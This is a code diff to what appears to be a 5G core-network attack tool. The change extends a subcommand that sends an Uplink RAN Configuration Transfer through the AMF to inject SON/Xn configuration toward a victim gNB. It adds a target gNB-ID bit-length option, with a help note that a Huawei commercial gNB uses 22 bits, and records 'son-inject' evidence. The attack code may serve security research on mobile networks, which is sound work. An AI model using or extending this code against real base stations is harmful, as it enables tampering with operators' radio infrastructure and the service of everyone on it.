@@ -426,12 +426,16 @@ def cmd_ran_config_update(gnb, a):
 
 def cmd_ul_ran_config_transfer(gnb, a):
     """g09: blind-relay SON/Xn config toward an attacker-named target gNB."""
+    tgt_len = int(getattr(a, "target_gnb_id_len", 32))
     gnb.send(B.uplink_ran_configuration_transfer(
-        gnb.cfg, target_gnb_id=a.target_gnb_id, source_gnb_id=a.source_gnb_id), wait=False)
+        gnb.cfg, target_gnb_id=a.target_gnb_id, source_gnb_id=a.source_gnb_id,
+        target_gnb_id_len=tgt_len), wait=False)
     print(f"[ul-ran-config-transfer] SON inject relayed via AMF -> "
-          f"target gNB-id={a.target_gnb_id:#x} (blind relay; observe DownlinkRAN"
-          f"ConfigurationTransfer at the target)")
-    _save(a.evidence, {"attack": "son-inject", "target_gnb_id": a.target_gnb_id})
+          f"target gNB-id={a.target_gnb_id:#x}/{tgt_len}bit "
+          f"(blind relay; observe DownlinkRANConfigurationTransfer at the target)")
+    _save(a.evidence, {"attack": "son-inject",
+                       "target_gnb_id": a.target_gnb_id,
+                       "target_gnb_id_len": tgt_len})
 
 
 def cmd_sweep(gnb, a):
@@ -947,6 +951,9 @@ def main():
     s = sub.add_parser("ul-ran-config-transfer")
     s.add_argument("--target-gnb-id", type=lambda x: int(x, 0), required=True,
                    help="victim gNB-id to inject SON/Xn config toward")
+    s.add_argument("--target-gnb-id-len", type=int, default=32,
+                   help="target gNB-ID bit length (UERANSIM 1 is 32; "
+                        "Huawei commercial gNB 0 is 22)")
     s.add_argument("--source-gnb-id", type=lambda x: int(x, 0), default=None)
 
     s = sub.add_parser("sweep")
